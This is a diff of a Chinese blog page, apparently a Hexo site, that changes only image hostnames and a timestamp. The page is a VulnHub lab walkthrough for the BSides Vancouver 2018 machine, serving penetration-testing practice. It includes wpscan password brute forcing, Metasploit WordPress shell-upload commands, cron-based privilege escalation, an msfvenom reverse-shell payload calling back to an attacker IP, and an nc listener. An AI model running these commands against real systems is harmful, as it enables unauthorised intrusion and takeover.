@@ -19,21 +19,21 @@
 <meta property="og:site_name" content="shackle">
 <meta property="og:description" content="Vulnhub 靶机渗透初见0X00 前言Vulnhub 是国外Vulnhub 团队建设的一套 靶机镜像网站，提供虚拟机的形式的靶机镜像、直接下载使用、一般来说是一个整套的系统(linux居多）。下面对平台上靶机系统进行渗透测试。  https://www.vulnhub.com/ 0X01 BSides Vancouver: 2018 (Workshop）下载地址：BSides Vancouve">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http://pn5jn1i1e.bkt.clouddn.com/180408/i9B8e6fmjH.png?imageslim">
-<meta property="og:image" content="http://pn5jn1i1e.bkt.clouddn.com/180408/JB1kilHHKA.png?imageslim">
-<meta property="og:image" content="http://pn5jn1i1e.bkt.clouddn.com/180408/HIGAGlgfBg.png?imageslim">
-<meta property="og:image" content="http://pn5jn1i1e.bkt.clouddn.com/180408/JcAIm6dheJ.png?imageslim">
-<meta property="og:image" content="http://pn5jn1i1e.bkt.clouddn.com/180408/7cDAkaI4k2.png?imageslim">
-<meta property="og:image" content="http://pn5jn1i1e.bkt.clouddn.com/180408/06F9iE18i8.png?imageslim">
-<meta property="og:image" content="http://pn5jn1i1e.bkt.clouddn.com/180408/m1Dd6iDll7.png?imageslim">
-<meta property="og:image" content="http://pn5jn1i1e.bkt.clouddn.com/180408/gH8j7iE1g0.png?imageslim">
-<meta property="og:image" content="http://pn5jn1i1e.bkt.clouddn.com/180408/94DA1fGGIF.png?imageslim">
-<meta property="og:image" content="http://pn5jn1i1e.bkt.clouddn.com/180408/9B8FblBjD4.png?imageslim">
-<meta property="og:updated_time" content="2019-02-19T03:32:12.222Z">
+<meta property="og:image" content="http://ps3bnv59u.bkt.clouddn.com/180408/i9B8e6fmjH.png?imageslim">
+<meta property="og:image" content="http://ps3bnv59u.bkt.clouddn.com/180408/JB1kilHHKA.png?imageslim">
+<meta property="og:image" content="http://ps3bnv59u.bkt.clouddn.com/180408/HIGAGlgfBg.png?imageslim">
+<meta property="og:image" content="http://ps3bnv59u.bkt.clouddn.com/180408/JcAIm6dheJ.png?imageslim">
+<meta property="og:image" content="http://ps3bnv59u.bkt.clouddn.com/180408/7cDAkaI4k2.png?imageslim">
+<meta property="og:image" content="http://ps3bnv59u.bkt.clouddn.com/180408/06F9iE18i8.png?imageslim">
+<meta property="og:image" content="http://ps3bnv59u.bkt.clouddn.com/180408/m1Dd6iDll7.png?imageslim">
+<meta property="og:image" content="http://ps3bnv59u.bkt.clouddn.com/180408/gH8j7iE1g0.png?imageslim">
+<meta property="og:image" content="http://ps3bnv59u.bkt.clouddn.com/180408/94DA1fGGIF.png?imageslim">
+<meta property="og:image" content="http://ps3bnv59u.bkt.clouddn.com/180408/9B8FblBjD4.png?imageslim">
+<meta property="og:updated_time" content="2019-05-26T03:10:17.704Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Vulnhub 靶机渗透初见">
 <meta name="twitter:description" content="Vulnhub 靶机渗透初见0X00 前言Vulnhub 是国外Vulnhub 团队建设的一套 靶机镜像网站，提供虚拟机的形式的靶机镜像、直接下载使用、一般来说是一个整套的系统(linux居多）。下面对平台上靶机系统进行渗透测试。  https://www.vulnhub.com/ 0X01 BSides Vancouver: 2018 (Workshop）下载地址：BSides Vancouve">
-<meta name="twitter:image" content="http://pn5jn1i1e.bkt.clouddn.com/180408/i9B8e6fmjH.png?imageslim">
+<meta name="twitter:image" content="http://ps3bnv59u.bkt.clouddn.com/180408/i9B8e6fmjH.png?imageslim">
   
     <link rel="alternate" href="/atom.xml" title="shackle" type="application/atom+xml">
   
@@ -201,29 +201,29 @@
 <p> <a href="https://www.vulnhub.com/" target="_blank" rel="noopener">https://www.vulnhub.com/</a></p>
 <h3 id="0X01-BSides-Vancouver-2018-Workshop）"><a href="#0X01-BSides-Vancouver-2018-Workshop）" class="headerlink" title="0X01 BSides Vancouver: 2018 (Workshop）"></a>0X01 BSides Vancouver: 2018 (Workshop）</h3><p>下载地址：<a href="https://www.vulnhub.com/entry/bsides-vancouver-2018-workshop,231/" target="_blank" rel="noopener">BSides Vancouver: 2018 (Workshop) ~ VulnHub</a>，可使用种子下载，速度较快。</p>
 <p>下载的VOA文件可用VirtualBox或者VMware Workstation导入使用。配置靶机的网络启动即可。</p>
-<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180408/i9B8e6fmjH.png?imageslim" alt="mark"></p>
+<p><img src="http://ps3bnv59u.bkt.clouddn.com/180408/i9B8e6fmjH.png?imageslim" alt="mark"></p>
 <h4 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h4><p>老规矩先扫描，可以看到 存在FTP Anonymous访问访问漏洞，</p>
 <p>nbtscan 192.168.1.1/24<br>nmap -A 192.168.1.32</p>
-<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180408/JB1kilHHKA.png?imageslim" alt="mark"></p>
-<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180408/HIGAGlgfBg.png?imageslim" alt="mark"></p>
+<p><img src="http://ps3bnv59u.bkt.clouddn.com/180408/JB1kilHHKA.png?imageslim" alt="mark"></p>
+<p><img src="http://ps3bnv59u.bkt.clouddn.com/180408/HIGAGlgfBg.png?imageslim" alt="mark"></p>
 <p>下载 users.txt.bk  得到用户名</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">abatchy</span><br><span class="line">john</span><br><span class="line">mai</span><br><span class="line">anne</span><br><span class="line">doomguy</span><br></pre></td></tr></table></figure>
 <h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>wpscan -u  <a href="http://192.168.1.32/backup_wordpress/" target="_blank" rel="noopener">http://192.168.1.32/backup_wordpress/</a><br>wpscan -u <a href="http://192.168.1.32/backup_wordpress" target="_blank" rel="noopener">http://192.168.1.32/backup_wordpress</a> -username john –wordlist /usr/share/wordlists/rockyou.txt</p>
 <p>利用 wp_admin_shell_upload 漏洞</p>
-<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180408/JcAIm6dheJ.png?imageslim" alt="mark"></p>
+<p><img src="http://ps3bnv59u.bkt.clouddn.com/180408/JcAIm6dheJ.png?imageslim" alt="mark"></p>
 <p>爆破  密码得到<strong>enigma</strong></p>
-<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180408/7cDAkaI4k2.png?imageslim" alt="mark"></p>
+<p><img src="http://ps3bnv59u.bkt.clouddn.com/180408/7cDAkaI4k2.png?imageslim" alt="mark"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">use exploit/unix/webapp/wp_admin_shell_upload</span><br><span class="line"></span><br><span class="line">msf exploit(unix/webapp/wp_admin_shell_upload) &gt;set rhost 192.168.1.32</span><br><span class="line"></span><br><span class="line">msf exploit(unix/webapp/wp_admin_shell_upload) &gt;set targeturi /backup-wordpress</span><br><span class="line"></span><br><span class="line">msf exploit(unix/webapp/wp_admin_shell_upload) &gt;set username john</span><br><span class="line"></span><br><span class="line">msf exploit(unix/webapp/wp_admin_shell_upload) &gt;set password enigma</span><br><span class="line"></span><br><span class="line">msf exploit(unix/webapp/wp_admin_shell_upload) &gt;exploit</span><br></pre></td></tr></table></figure>
-<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180408/06F9iE18i8.png?imageslim" alt="mark"></p>
+<p><img src="http://ps3bnv59u.bkt.clouddn.com/180408/06F9iE18i8.png?imageslim" alt="mark"></p>
 <h4 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h4><p>但是没有root权限，下一步需要提权。</p>
 <p>一般来说 linux提权可以使用用exp提权，或者通过计划任务、SUID文件属性进行提权。这里使用计划任务，查看root用户执行的计划任务。<code>cat crontab</code> ，把远控脚本写入<code>/usr/local/bin/cleanup</code>中，执行，用nc反向连接。</p>
-<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180408/m1Dd6iDll7.png?imageslim" alt="mark"></p>
+<p><img src="http://ps3bnv59u.bkt.clouddn.com/180408/m1Dd6iDll7.png?imageslim" alt="mark"></p>
 <p>msfvenom -p cmd / unix / reverse_python lhost = 192.168.1.63 lport = 9866 R  #msfveom 生成python后门 </p>
-<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180408/gH8j7iE1g0.png?imageslim" alt="mark"></p>
+<p><img src="http://ps3bnv59u.bkt.clouddn.com/180408/gH8j7iE1g0.png?imageslim" alt="mark"></p>
 <p>上传python远控木马</p>
-<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180408/94DA1fGGIF.png?imageslim" alt="mark"></p>
+<p><img src="http://ps3bnv59u.bkt.clouddn.com/180408/94DA1fGGIF.png?imageslim" alt="mark"></p>
 <p>nc -lvp 9866   # nc 反向监听</p>
-<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180408/9B8FblBjD4.png?imageslim" alt="mark"></p>
+<p><img src="http://ps3bnv59u.bkt.clouddn.com/180408/9B8FblBjD4.png?imageslim" alt="mark"></p>
 <h3 id="0X02-总结"><a href="#0X02-总结" class="headerlink" title="0X02 总结"></a>0X02 总结</h3><p>通过对以上靶机进行渗透测试，可以看出Vulnhub 靶机平台的靶机镜像环境还是不错的，平台提供初中高级的靶机镜像、从Web安全到系统安全也可以。基本可以涵盖大部分的渗透测试流程，可以较为方便的实验测试靶机。</p>
 
       
